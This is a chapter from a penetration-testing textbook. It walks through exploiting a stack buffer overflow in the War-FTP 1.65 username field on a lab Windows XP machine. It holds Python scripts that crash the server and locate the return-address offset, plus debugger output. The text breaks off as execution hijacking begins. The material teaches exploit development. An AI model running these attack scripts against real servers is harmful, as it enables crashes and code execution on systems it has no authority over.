<html><head></head><body><section class="chapter" epub:type="chapter" id="stack-based_buffer_overflow_in_windows" title="Chapter&#xA0;17.&#xA0;A Stack-Based Buffer Overflow in Windows"><div class="titlepage"><div><div><h2 class="title">Chapter 17. A Stack-Based Buffer Overflow in Windows</h2></div></div></div><p><a class="indexterm" id="iddle1145"/><a class="indexterm" id="iddle1423"/><a class="indexterm" id="iddle2236"/><a class="indexterm" id="iddle2242"/>In this chapter, we will look at exploiting a stack-based buffer overflow in an older version of a Windows-based FTP server. As we did in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, we will attempt to overwrite the return pointer saved onto the stack when a function is called, as shown earlier in <a class="xref" href="ch16.xhtml#stack_after_call_to_function1" title="Figure 16-3. Stack after call to function1">Figure 16-3</a>. When the function <code class="literal">main</code> calls <code class="literal">function1</code>, the next instruction to be executed is saved on the stack, and a stack frame for <code class="literal">function1</code> is added to the stack.</p><p>The size of <code class="literal">function1</code>’s local variables is determined when the application is compiled and fixed. The amount of space “reserved” on the stack for these local variables is fixed, too. This reservation is called a <span class="emphasis"><em>stack buffer</em></span>. If we put more data in the stack buffer than it can hold, we will cause the buffer to overflow. Then we may be able to overwrite the saved return address, which is placed after the stack buffer, and take control of program execution. (For a more detailed review of this process, see <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>.)</p><p>In <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, we installed War-FTP version 1.65 on the Windows XP target, but we didn’t start it. We have exploited the FileZilla FTP server in previous chapters, and if you’ve been following along, that FTP server is still <a class="indexterm" id="iddle2121"/><a class="indexterm" id="iddle2241"/><a class="indexterm" id="iddle2409"/><a class="indexterm" id="iddle2422"/>running. Before we can use War-FTP, we need to stop the FileZilla FTP server using the XAMPP control panel. This will open TCP port 21 for War-FTP. Open War-FTP on the Windows XP desktop by double clicking its icon (see <a class="xref" href="ch17.xhtml#war-ftp_icon" title="Figure 17-1. War-FTP icon">Figure 17-1</a>), and click the lightning bolt in the top-left corner of the War-FTP window to put it online (see <a class="xref" href="ch17.xhtml#war-ftp_1dot65_gui" title="Figure 17-2. War-FTP 1.65 GUI">Figure 17-2</a>).</p><div class="figure"><a id="war-ftp_icon"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00160"/><img alt="War-FTP icon" src="httpatomoreillycomsourcenostarchimages2030510.png.jpg"/></div></div><div class="figure-title">Figure 17-1. War-FTP icon</div></div><div class="sect1" title="Searching for a Known Vulnerability in War-FTP"><div class="titlepage"><div><div><h2 class="title" id="searching_for_a_known_vulnerability_in_w" style="clear: both">Searching for a Known Vulnerability in War-FTP</h2></div></div></div><p>A search on Google for known vulnerabilities in War-FTP 1.65 finds the following information on <span class="emphasis"><em>SecurityFocus.com</em></span>:</p><div class="blockquote"><blockquote class="blockquote"><p>War-FTP Username Stack-Based Buffer-Overflow Vulnerability</p><p>War-FTP is prone to a stack-based buffer-overflow vulnerability because it fails to properly check boundaries on user-supplied data before copying it to an insufficiently sized buffer.</p><p>Exploiting this issue could lead to denial-of-service conditions and to the execution of arbitrary machine code in the context of the application.</p></blockquote></div><p>In <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, we overflowed a function’s local variable on the stack with supplied input and redirected execution to a memory location of our choosing. Based on this information from <span class="emphasis"><em>SecurityFocus.com</em></span>, it looks like we can do something similar with War-FTP 1.65. In this chapter, we will manually exploit War-FTP 1.65’s stack-based buffer overflow vulnerability in the Username field of the FTP login. Now that we are using a real program rather than demo code, we will learn more about writing real exploits. For example, this time we won’t be able to simply redirect execution to another function; we will instead need to introduce instructions to be executed as part of our attack string.</p><p>To get started, make sure War-FTP 1.65 is open and running on your Win-dows XP virtual machine. (The lightning bolt icon in the top-left corner of the GUI shown in <a class="xref" href="ch17.xhtml#war-ftp_1dot65_gui" title="Figure 17-2. War-FTP 1.65 GUI">Figure 17-2</a> tells the server to listen for incoming connections.)</p><p>The issue we are going to exploit is particularly dangerous because an attacker does not need to log in to the FTP server before launching an attack. Thus, we do not need to add any legitimate users to the FTP server for this attack to work.</p><p>Before we dive in and start trying to exploit War-FTP, let’s hook it up to a debugger. Immunity Debugger should be on the desktop of your Windows XP target because we installed it in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>. If it is not, follow the instructions in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a> for setting up Immunity Debugger and the Mona plugin. Like GDB, Immunity Debugger will allow us to see the internals of memory as we attempt to exploit War-FTP. Unfortunately, we don’t have source code to guide us toward a successful exploit, but by watching our program in memory as we send it attack strings, we should still be able to develop a working exploit.</p><div class="figure"><a id="war-ftp_1dot65_gui"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00161"/><img alt="War-FTP 1.65 GUI" src="httpatomoreillycomsourcenostarchimages2030512.png.jpg"/></div></div><div class="figure-title">Figure 17-2. War-FTP 1.65 GUI</div></div><p><a class="indexterm" id="iddle1501"/><a class="indexterm" id="iddle1910"/><a class="indexterm" id="iddle1995"/>Start Immunity Debugger, open the <span class="strong"><strong>File</strong></span> menu, and select <span class="strong"><strong>Attach</strong></span>. We want to attach Immunity Debugger to the running War-FTP process, which we see in the process list in <a class="xref" href="ch17.xhtml#process_list_in_the_immunity_debugger_in" title="Figure 17-3. Process list in the Immunity Debugger interface">Figure 17-3</a>. Highlight War-FTP 1.65, and click <span class="strong"><strong>Attach</strong></span>.</p><div class="figure"><a id="process_list_in_the_immunity_debugger_in"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00162"/><img alt="Process list in the Immunity Debugger interface" src="httpatomoreillycomsourcenostarchimages2030514.png.jpg"/></div></div><div class="figure-title">Figure 17-3. Process list in the Immunity Debugger interface</div></div><p><a class="indexterm" id="iddle1213"/><a class="indexterm" id="iddle2237"/>When Immunity Debugger first attaches to a process, it pauses the process’s execution. If at any point your exploit just randomly stops working, check to make sure the process is running. A paused process isn’t listening for incoming connections, and, as you can see in the lower-right corner of the Immunity Debugger window in <a class="xref" href="ch17.xhtml#war-ftp_pauses_in_immunity_debuggerdot" title="Figure 17-4. War-FTP pauses in Immunity Debugger.">Figure 17-4</a>, the process is paused. Click the <span class="strong"><strong>Play</strong></span> button at the top-left corner of the screen to tell the process to continue running.</p><div class="figure"><a id="war-ftp_pauses_in_immunity_debuggerdot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00163"/><img alt="War-FTP pauses in Immunity Debugger." src="httpatomoreillycomsourcenostarchimages2030516.png.jpg"/></div></div><div class="figure-title">Figure 17-4. War-FTP pauses in Immunity Debugger.</div></div><p>With War-FTP running in Immunity Debugger, we can figure out how to exploit its buffer overflow vulnerability.</p></div><div class="sect1" title="Causing a Crash"><div class="titlepage"><div><div><h2 class="title" id="causing_a_crash-id00045" style="clear: both">Causing a Crash</h2></div></div></div><p>In <a class="xref" href="ch19.xhtml" title="Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules">Chapter 19</a>, we will use a technique called <span class="emphasis"><em>fuzzing</em></span> to look for potential vulnerabilities in programs, but for now, follow my lead on which attack strings to use to crash the program. In the Username field of the FTP login, let’s send a string of 1,100 <span class="emphasis"><em>A</em></span>s instead of a username. Rather than attacking our program locally, as we did in the previous example, this time we will <a class="indexterm" id="iddle2421"/>create our exploit in Kali Linux and set up the exploit to talk to the FTP server over the network. <a class="xref" href="ch17.xhtml#python_exploit_to_crash_war-ftp" title="Example 17-1. Python exploit to crash War-FTP">Example 17-1</a> shows a starter exploit that will cause the War-FTP program to crash.</p><div class="note" title="Note"><h3 class="title"><a id="ch17note01"/>Note</h3><p>Our exploit examples are written in Python, but they can easily be ported into another language if you’d prefer to use a different one.</p></div><div class="example"><a id="python_exploit_to_crash_war-ftp"/><div class="example-title">Example 17-1. Python exploit to crash War-FTP</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat ftpexploit</strong></span>&#13;
#!/usr/bin/python&#13;
import socket&#13;
buffer = "A" * 1100&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) ❶&#13;
connect=s.connect(('192.168.20.10',21)) ❶&#13;
response = s.recv(1024)&#13;
print response ❷&#13;
s.send('USER ' + buffer  + '\r\n') ❸&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('PASS PASSWORD\r\n')&#13;
s.close()</pre></div></div><p>In the exploit shown in <a class="xref" href="ch17.xhtml#python_exploit_to_crash_war-ftp" title="Example 17-1. Python exploit to crash War-FTP">Example 17-1</a>, we first import the socket Python library. Next, we create a string called <span class="emphasis"><em>buffer</em></span>, which contains 1,100 <span class="emphasis"><em>A</em></span>s, and set up a socket at ❶ to connect to our Windows XP machine on port 21, where the War-FTP server is listening. Next, we accept and print out the FTP server’s banner to the screen at ❷. Our exploit then sends over the <code class="literal">USER</code> command with 1,100 <span class="emphasis"><em>A</em></span>s ❸ for the username in hopes of causing the FTP server to crash.</p><p>If the server responds and asks for our password, the exploit is ready to finish the connection with the password, <span class="emphasis"><em>PASSWORD</em></span>. However, if our exploit succeeds, it won’t matter if our credentials are valid, because the program will crash before it finishes the login process. Finally, we close our socket, and the exploit finishes. Make sure the Python script is executable with <code class="literal">chmod +x</code>, and run the exploit as shown here.</p><a id="pro_id00204"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>chmod +x ftpexploit</strong></span>&#13;
root@kali:~# <span class="strong"><strong>./ftpexploit</strong></span>&#13;
220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready&#13;
220 Please enter your user name.&#13;
331 User name okay, Need password.</pre><p>As with the previous example, we hope to overwrite the saved return address with a string of <span class="emphasis"><em>A</em></span>s and cause the program to crash. The War-FTP server sends over its welcome banner, prompts us for our username, and then asks for a password. Take a look at War-FTP in Immunity Debugger, as shown in <a class="xref" href="ch17.xhtml#war-ftp_crashes_due_to_a_buffer_overflow" title="Figure 17-5. War-FTP crashes due to a buffer overflow.">Figure 17-5</a>, to see if our exploit managed to cause a crash.</p><div class="figure"><a id="war-ftp_crashes_due_to_a_buffer_overflow"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00164"/><img alt="War-FTP crashes due to a buffer overflow." src="httpatomoreillycomsourcenostarchimages2030518.png.jpg"/></div></div><div class="figure-title">Figure 17-5. War-FTP crashes due to a buffer overflow.</div></div><p><a class="indexterm" id="iddle1144"/><a class="indexterm" id="iddle1320"/><a class="indexterm" id="iddle2240"/>After we run our exploit, we see that War-FTP is paused due to an access violation when attempting to execute an instruction at <code class="literal">41414141</code>. Based on what we learned in the Linux buffer overflow example in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, this result should seem familiar. A return address was overwritten by our long string of <span class="emphasis"><em>A</em></span>s, so when the function returned, <code class="literal">41414141</code> was loaded into the EIP register. The program attempted to execute the instructions at that memory location, which was out of bounds and caused a crash.</p></div><div class="sect1" title="Locating EIP"><div class="titlepage"><div><div><h2 class="title" id="locating_eip" style="clear: both">Locating EIP</h2></div></div></div><p>As with the previous example, we need to know which four <span class="emphasis"><em>A</em></span>s in our string are overwriting the return address. Unfortunately, 1,100 <span class="emphasis"><em>A</em></span>s is a bit more than the 30 we used in the previous chapter, so just counting in memory is more difficult in this case. Also, we can’t be sure if the first <span class="emphasis"><em>A</em></span>s we’re seeing on the stack are the first <span class="emphasis"><em>A</em></span>s sent as part of the exploit.</p><p>Traditionally, the next step would be to crash the program again with 550 <span class="emphasis"><em>A</em></span>s followed by 550 <span class="emphasis"><em>B</em></span>s. If the program crashed with <code class="literal">41414141</code> in EIP, then the return address overwrite occurred in the first 550 bytes; if it crashed with <code class="literal">42424242</code> in EIP, the overwrite was in the second half. From there, the half of the string in question would be split into 275 <span class="emphasis"><em>A</em></span>s followed by 275 <span class="emphasis"><em>B</em></span>s. Slowly but surely, this method would narrow down the exact location.</p><div class="sect2" title="Generating a Cyclical Pattern to Determine Offset"><div class="titlepage"><div><div><h3 class="title" id="generating_a_cyclical_pattern_to_determi">Generating a Cyclical Pattern to Determine Offset</h3></div></div></div><p><a class="indexterm" id="iddle1243"/><a class="indexterm" id="iddle1748"/><a class="indexterm" id="iddle1853"/>Luckily, we can use Mona to generate a unique cyclic pattern to find the right four bytes for the return address overwrite in only one iteration. To use Mona for this task, enter <span class="strong"><strong><code class="literal">!mona pattern_create</code></strong></span> with length <span class="strong"><strong>1100</strong></span> as an argument at the bottom of the Immunity Debugger window, as shown in <a class="xref" href="ch17.xhtml#using_patternunderscorecreate_in_mona" title="Figure 17-6. Using pattern_create in Mona">Figure 17-6</a>.</p><div class="figure"><a id="using_patternunderscorecreate_in_mona"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00165"/><img alt="Using pattern_create in Mona" src="httpatomoreillycomsourcenostarchimages2030520.png.jpg"/></div></div><div class="figure-title">Figure 17-6. Using <code class="literal">pattern_create</code> in Mona</div></div><p>The 1,100-character cyclic pattern is written to the file <span class="emphasis"><em>C:\logs\war-ftpd\pattern.txt</em></span>, as shown in <a class="xref" href="ch17.xhtml#output_of_the_patternunderscorecreate_co" title="Example 17-2. Output of the pattern_create command">Example 17-2</a>.</p><div class="example"><a id="output_of_the_patternunderscorecreate_co"/><div class="example-title">Example 17-2. Output of the <code class="literal">pattern_create</code> command</div><div class="example-contents"><pre class="programlisting">=============================================================================&#13;
  Output generated by mona.py v2.0, rev 451 - Immunity Debugger&#13;
  Corelan Team - https://www.corelan.be&#13;
=============================================================================&#13;
  OS : xp, release 5.1.2600&#13;
  Process being debugged : war-ftpd (pid 2416)&#13;
=============================================================================&#13;
  2015-11-10 11:03:32&#13;
=============================================================================&#13;
&#13;
Pattern of 1100 bytes :&#13;
-----------------------&#13;
&#13;
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5&#13;
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1&#13;
Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7&#13;
Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3&#13;
Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9&#13;
An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5&#13;
Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1&#13;
As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7&#13;
Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3&#13;
Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9&#13;
Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5&#13;
Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1&#13;
Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7&#13;
Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3&#13;
Bk4Bk5Bk</pre></div></div><p>We are going to replace the long string of <span class="emphasis"><em>A</em></span>s with the unique pattern shown in <a class="xref" href="ch17.xhtml#output_of_the_patternunderscorecreate_co" title="Example 17-2. Output of the pattern_create command">Example 17-2</a>. But before running the exploit again, we need to restart War-FTP from the previous crash. In Immunity Debugger, go to <span class="strong"><strong>Debug</strong></span> ▸ <span class="strong"><strong>Restart</strong></span>, and then press the <span class="strong"><strong>Play</strong></span> button and click the lightning bolt icon to tell War-FTP to listen on the network. (Follow these steps each time you need to restart War-FTP after a crash.) Alternatively, you can close Immunity Debugger, restart War-FTP manually, and attach to the new process in the debugger. Replace the value of the buffer in the exploit with the pattern from <a class="xref" href="ch17.xhtml#output_of_the_patternunderscorecreate_co" title="Example 17-2. Output of the pattern_create command">Example 17-2</a>, surrounded by quotation marks to make it a string in Python, as shown in <a class="xref" href="ch17.xhtml#exploit_with_cyclic_pattern" title="Example 17-3. Exploit with cyclic pattern">Example 17-3</a>.</p><div class="note" title="Note"><h3 class="title"><a id="ch17note02"/>Note</h3><p>If War-FTP refuses to restart with the error <span class="emphasis"><em>Unknown format for user database</em></span>, find and delete the files <span class="emphasis"><em>FtpDaemon.dat</em></span> and/or <span class="emphasis"><em>FtpDaemon.ini</em></span> that were created on the desktop by War-FTP. This should fix the problem and War-FTP should start normally.</p></div><div class="example"><a id="exploit_with_cyclic_pattern"/><div class="example-title">Example 17-3. Exploit with cyclic pattern</div><div class="example-contents"><pre class="programlisting">  root@kali:~# <span class="strong"><strong>cat ftpexploit</strong></span>&#13;
  #!/usr/bin/python&#13;
  import socket&#13;
❶ buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2&#13;
  Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8&#13;
  Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4&#13;
  Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0&#13;
  Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6&#13;
  Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2&#13;
  Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ap3Ar7Ar8&#13;
  Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4&#13;
  Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Ax2Ax3Ax4&#13;
  Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0&#13;
  Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7&#13;
  Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3&#13;
  Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9&#13;
  Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5&#13;
  Bk"&#13;
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
  connect=s.connect(('192.168.20.10',21))&#13;
  response = s.recv(1024)&#13;
  print response&#13;
  s.send('USER ' + buffer  + '\r\n')&#13;
  response = s.recv(1024)&#13;
  print response&#13;
  s.send('PASS PASSWORD\r\n')&#13;
  s.close()</pre></div></div><p><a class="indexterm" id="iddle1747"/>Now run the exploit again with the generated pattern starting at ❶, replacing the 1,100 <span class="emphasis"><em>A</em></span>s.</p><a id="pro_id00205"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>./ftpexploit</strong></span>&#13;
220- Jgaa's Fan Club FTP Service WAR-FTPD 1.65 Ready&#13;
220 Please enter your user name.&#13;
331 User name okay, Need password.</pre><p>Having run our exploit with Metasploit’s pattern, look back at Immunity Debugger, as shown in <a class="xref" href="ch17.xhtml#finding_the_return_address_overwrite" title="Figure 17-7. Finding the return address overwrite">Figure 17-7</a>, to see what value is contained in EIP and to find out where in our attack string we overwrite the return address.</p><div class="figure"><a id="finding_the_return_address_overwrite"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00166"/><img alt="Finding the return address overwrite" src="httpatomoreillycomsourcenostarchimages2030522.png.jpg"/></div></div><div class="figure-title">Figure 17-7. Finding the return address overwrite</div></div><p>War-FTP has crashed again, but this time EIP contains four bytes of our generated pattern: <code class="literal">32714131</code>. We can use Mona to determine where exactly in <a class="indexterm" id="iddle1321"/><a class="indexterm" id="iddle1854"/>the 1,100-character cyclic pattern the ASCII equivalent of <code class="literal">32714131</code> is. Enter <span class="strong"><strong><code class="literal">!mona pattern_offset 32714131</code></strong></span> to get just the offset, or enter <span class="strong"><strong><code class="literal">!mona findmsp</code></strong></span> at the Immunity Debugger prompt, as shown in <a class="xref" href="ch17.xhtml#finding_the_pattern_offsets_in_mona" title="Figure 17-8. Finding the pattern offsets in Mona">Figure 17-8</a>, to have Mona perform additional analysis on all registers and on instances of the pattern in memory.</p><div class="figure"><a id="finding_the_pattern_offsets_in_mona"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00167"/><img alt="Finding the pattern offsets in Mona" src="httpatomoreillycomsourcenostarchimages2030524.png.jpg"/></div></div><div class="figure-title">Figure 17-8. Finding the pattern offsets in Mona</div></div><p>Mona finds instances of the cyclic pattern in memory. The output of the command is written to <span class="emphasis"><em>C:\logs\war-ftpd\findmsp.txt</em></span>. Part of the output is shown here.</p><a id="pro_id00206"/><pre class="programlisting">EIP contains normal pattern : 0x32714131 (offset 485)&#13;
ESP (0x00affd48) points at offset 493 in normal pattern (length 607)&#13;
EDI (0x00affe48) points at offset 749 in normal pattern (length 351)&#13;
EBP (0x00affda0) points at offset 581 in normal pattern (length 519)</pre></div><div class="sect2" title="Verifying Offsets"><div class="titlepage"><div><div><h3 class="title" id="verifying_offsets">Verifying Offsets</h3></div></div></div><p>According to Mona, our return address overwrite is 485 bytes into the attack string. We can verify this, as shown in <a class="xref" href="ch17.xhtml#verifying_the_eip_offset" title="Example 17-4. Verifying the EIP offset">Example 17-4</a>.</p><div class="example"><a id="verifying_the_eip_offset"/><div class="example-title">Example 17-4. Verifying the EIP offset</div><div class="example-contents"><pre class="programlisting">  root@kali:~# <span class="strong"><strong>cat ftpexploit</strong></span>&#13;
  #!/usr/bin/python&#13;
  import socket&#13;
❶ buffer = "A" * 485 + "B" * 4 + "C" * 611&#13;
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
  connect=s.connect(('192.168.20.10',21))&#13;
  response = s.recv(1024)&#13;
  print response&#13;
  s.send('USER ' + buffer  + '\r\n')&#13;
  response = s.recv(1024)&#13;
  print response&#13;
  s.send('PASS PASSWORD\r\n')&#13;
  s.close()</pre></div></div><p>Now we’ll create an attack string that contains 485 <span class="emphasis"><em>A</em></span>s, 4 <span class="emphasis"><em>B</em></span>s, and 611 <span class="emphasis"><em>C</em></span>s as shown at ❶ in <a class="xref" href="ch17.xhtml#verifying_the_eip_offset" title="Example 17-4. Verifying the EIP offset">Example 17-4</a>. With our new string in place, if EIP contains <code class="literal">42424242</code> when the program crashes, we’ll know we have found the correct four bytes for the return address. (Remember to restart War-FTP in Immunity Debugger before running the exploit again.) Now, check EIP, as shown in <a class="xref" href="ch17.xhtml#war-ftp_crashes_with_eip_filled_with_bs" title="Figure 17-9. War-FTP crashes with EIP filled with Bs">Figure 17-9</a>.</p><p>As expected, War-FTP has crashed again, this time with <code class="literal">42424242</code> in EIP. This result confirms that we have found the location of the return address in our attack string. Next we need to find someplace to redirect execution and exploit this buffer overflow vulnerability.</p><div class="figure"><a id="war-ftp_crashes_with_eip_filled_with_bs"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00168"/><img alt="War-FTP crashes with EIP filled with Bs" src="httpatomoreillycomsourcenostarchimages2030526.png.jpg"/></div></div><div class="figure-title">Figure 17-9. War-FTP crashes with EIP filled with Bs</div></div></div></div><div class="sect1" title="Hijacking Execution"><div class="titlepage"><div><div><h2 class="title" id="hijacking_execution-id00046" style="clear: both">Hijacking Execution</h2></div></div></div><p><a class="indexterm" id="iddle1161"/><a class="indexterm" id="iddle1308"/><a class="indexterm" id="iddle1314"/><a class="indexterm" id="iddle1322"/><a class="indexterm" id="iddle1339"/><a class="indexterm" id="iddle1355"/><a class="indexterm" id="iddle1752"/><a class="indexterm" id="iddle1855"/><a class="indexterm" id="iddle2239"/>In the exploit example discussed in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, we sent execution to another function. Unfortunately, because we don’t have the source code of War-FTP to review for potentially interesting code, we’ll use a more typical technique for exploit development this time. Instead of redirecting execution to somewhere else in the program, we will introduce our own instructions and redirect execution to part of our attack string.</p><p>First, we need to find out if part of our attack string is easily accessible at the time of the crash. Look back at the output of the <code class="literal">!mona findmsp</code> command in <span class="emphasis"><em>C:\logs\warftp-d\findmsp.txt</em></span>, as shown here.</p><a id="pro_id00207"/><pre class="programlisting">EIP contains normal pattern : 0x32714131 (offset 485)&#13;
ESP (0x00affd48) points at offset 493 in normal pattern (length 607)&#13;
EDI (0x00affe48) points at offset 749 in normal pattern (length 351)&#13;
EBP (0x00affda0) points at offset 581 in normal pattern (length 519)</pre><p>In addition to taking control of EIP, the registers ESP, EDI, and EBP also point to part of the attack string. In other words, our attack string decides the contents of these registers, and there’s nothing to stop us from replacing the part of the attack string (the <span class="emphasis"><em>C</em></span>s in our current crash) with useful instructions for the CPU to execute.</p><p>We can see that ESP is at memory address <code class="literal">00AFFD48</code>, while EBP is slightly higher in memory at address <code class="literal">00AFFDA0</code>. EDI is at <code class="literal">00AFFE48</code>. We could redirect execution to any of these locations, but with the lower address farther up the stack, we have a little more space for our instructions.</p><div class="note" title="Note"><h3 class="title"><a id="ch17note03"/>Note</h3><p>Also, note that ESP does not point directly to the beginning of our Cs. Our saved return pointer overwrite is at byte 485 in the pattern, but ESP is at 493, eight bytes away (four bytes for the return address and four bytes of Cs).</p></div><p>Right-click <span class="strong"><strong>ESP</strong></span> in the top right of the Immunity Debugger window, and select <span class="strong"><strong>Follow in Stack</strong></span>. The stack is shown in the bottom right of the Immunity Debugger window. Scroll up a few lines, as shown in <a class="xref" href="ch17.xhtml#esp_controlled_by_the_attack_string" title="Figure 17-10. ESP controlled by the attack string">Figure 17-10</a>.</p><p>Notice that the line above ESP also contains four <span class="emphasis"><em>C</em></span>s, and above that are four <span class="emphasis"><em>B</em></span>s for the return address. This tells us that we need to start our malicious instructions for the CPU to execute four bytes into our <span class="emphasis"><em>C</em></span>s in the attack string (because ESP is four bytes into the <span class="emphasis"><em>C</em></span>s); otherwise, the first four bytes of our shellcode will be missed. (This sort of scenario will come up frequently because these four <span class="emphasis"><em>C</em></span>s are caused by a calling convention and indicate that the function has cleaned-up arguments.)</p><div class="note" title="Note"><h3 class="title"><a id="ch17note04"/>Note</h3><p>Calling conventions are a set of rules implemented in a compiler, describing how a child function will receive arguments from its caller function. Some conventions will cause the caller function to remove the arguments from the stack, while others state that the child function must remove the arguments. The latter will cause one or more dwords (depending on the number of arguments) to be skipped on the stack automatically, as shown in <a class="xref" href="ch17.xhtml#esp_controlled_by_the_attack_string" title="Figure 17-10. ESP controlled by the attack string">Figure 17-10</a>, as soon as the child function ends.</p></div><div class="figure"><a id="esp_controlled_by_the_attack_string"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00169"/><img alt="ESP controlled by the attack string" src="httpatomoreillycomsourcenostarchimages2030528.png.jpg"/></div></div><div class="figure-title">Figure 17-10. ESP controlled by the attack string</div></div><p>Now we can just put <code class="literal">00AFFD48</code> into the return address, replace 